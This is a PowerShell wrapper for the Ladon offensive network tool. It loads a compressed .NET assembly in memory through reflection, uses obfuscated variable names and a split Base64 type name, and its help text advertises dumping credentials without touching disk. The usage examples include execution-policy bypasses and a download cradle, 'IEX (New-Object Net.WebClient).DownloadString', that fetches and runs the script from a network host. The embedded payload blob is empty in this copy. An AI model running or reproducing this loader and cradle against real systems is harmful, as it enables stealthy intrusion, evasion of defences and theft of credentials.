function Ladon
{
<#
.SYNOPSIS

This script leverages Ladon 10.10.6 and Reflection.Assembly to reflectively load Ladon completely in memory. This allows you to do things such as
dump credentials without ever writing the Ladon binary to disk. 

Required Dependencies: Ladon (included)
Optional Dependencies: None
Ladon version: 10.10.6 (20230528)

.DESCRIPTION

Reflectively loads Ladon 10.10.6 in memory using PowerShell. Can be used to scan network without writing anything to disk. Can be used for any 
functionality provided with Ladon.

.TestON

Win7 x86  (Microsoft Windows [6.1.7601])
Win8 x64  (Microsoft Windows [6.2.9200])
Win10 x64 (Microsoft Windows [10.0.14393])
Win11 x64 (Microsoft Windows [10.0.22000.856]

.EXAMPLE

Execute Ladon on the local computer to scan network OnlinePC.
Ladon OnlinePC
Ladon 192.168.1.8/24 OnlinePC

0x001 Cmd
powershell 
Import-Module .\Ladon.ps1
Ladon OnlinePC

0x002 Local
powershell -exec bypass Import-Module .\Ladon.ps1;Ladon whoami

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass Import-Module .\Ladon.ps1;Ladon whoami

0x003 Remote
powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.8/Ladon.ps1'); Ladon OnlinePC"

0x004 Bypass
powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon OnlinePC

0x005 Diy PortScan
powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon PortScan '22,80,135,445'


#>
Param      
(       
[parameter(
#Mandatory = $true,
Position = 0
)]
$Q7MGIzea = "",
[parameter(
Position = 1
)]
$z9cZmQB = "",
[parameter(
Position = 2
)]
$z8kaB = "",
[parameter(
Position = 3
)]
$Kjeb3g = "",
[parameter(
Position = 4
)]
$z8vie = "",
[parameter(
Position = 5
)]
$rdX9D = "",
[parameter(
Position = 6
)]
$Df9Dd = "",
[parameter(
Position = 7
)]
$vbtpb = "",
[parameter(
Position = 8
)]
$bH8T3b
)

$SkBSS =@'
'@
$hk3kd = New-object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($SkBSS),[IO.Compression.CompressionMode]::Decompress)
$AzdsZ = New-object Byte[](2228072)
$hk3kd.Read($AzdsZ, 0, 2228072) | Out-Null
$b8ujk = "Q29uc2"+"9sZUFwc"+"DEuUHJv"+"Z3JhbQ=="
$d3gsd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b8ujk))
$Kb82F = [Reflection.Assembly]::Load($AzdsZ).GetType($d3gsd)
If([String]::IsNullOrEmpty($bH8T3b)){ If($Q7MGIzea -ne "" -and $z9cZmQB -ne "" -and $z8kaB -ne "" -and $Kjeb3g -ne "" -and $z8vie -ne "" -and $rdX9D -ne "" -and $Df9Dd -ne "" -and $vbtpb -ne ""  ){$Kb82F::Main(@($Q7MGIzea,$z9cZmQB,$z8kaB,$Kjeb3g,$z8vie,$rdX9D,$Df9Dd,$vbtpb))}else{If($Q7MGIzea -ne "" -and $z9cZmQB -ne "" -and $z8kaB -ne "" -and $Kjeb3g -ne "" -and $z8vie -ne "" -and $rdX9D -ne "" -and $Df9Dd -ne "" ){$Kb82F::Main(@($Q7MGIzea,$z9cZmQB,$z8kaB,$Kjeb3g,$z8vie,$rdX9D,$Df9Dd))}else{If($Q7MGIzea -ne "" -and $z9cZmQB -ne "" -and $z8kaB -ne "" -and $Kjeb3g -ne "" -and $z8vie -ne "" -and $rdX9D -ne "" ){$Kb82F::Main(@($Q7MGIzea,$z9cZmQB,$z8kaB,$Kjeb3g,$z8vie,$rdX9D))} else{If($Q7MGIzea -ne "" -and $z9cZmQB -ne "" -and $z8kaB -ne "" -and $Kjeb3g -ne "" -and $z8vie -ne "" ){$Kb82F::Main(@($Q7MGIzea,$z9cZmQB,$z8kaB,$Kjeb3g,$z8vie))} else {If($Q7MGIzea -ne "" -and $z9cZmQB -ne "" -and $z8kaB -ne "" -and $Kjeb3g -ne "" ){$Kb82F::Main(@($Q7MGIzea,$z9cZmQB,$z8kaB,$Kjeb3g))} else {If($Q7MGIzea -ne "" -and $z9cZmQB -ne "" -and $z8kaB -ne "" ){$Kb82F::Main(@($Q7MGIzea,$z9cZmQB,$z8kaB))} else {If($Q7MGIzea -ne "" -and $z9cZmQB -ne "" ){$Kb82F::Main(@($Q7MGIzea,$z9cZmQB))}else {If($Q7MGIzea -ne "" ){$Kb82F::Main(@($Q7MGIzea))}}}}}}}}}
}